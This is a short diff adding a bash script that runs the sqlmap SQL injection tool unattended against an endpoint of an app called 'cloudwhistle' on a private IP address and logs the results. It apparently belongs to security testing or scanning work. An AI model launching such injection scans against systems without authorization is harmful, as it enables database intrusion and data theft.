@@ -1,0 +1,2 @@
+#!/bin/bash
+python /Users/zhaichuang/Downloads/sqlmapTools/sqlmap.py -u "https://172.16.56.180/cloudwhistle/index.php?m=confInfo&a=getSchoolList&device=android&platform=android&device_type=android&city_id=10&app_version=5.8.1.15037&school=null&version=5.8.1.15037&uid=0&package_name=com.ruijie.whistle" --level=1 --batch >>/Users/zhaichuang/Desktop/python/GjWshile/Client/Client_logfiles/0.log
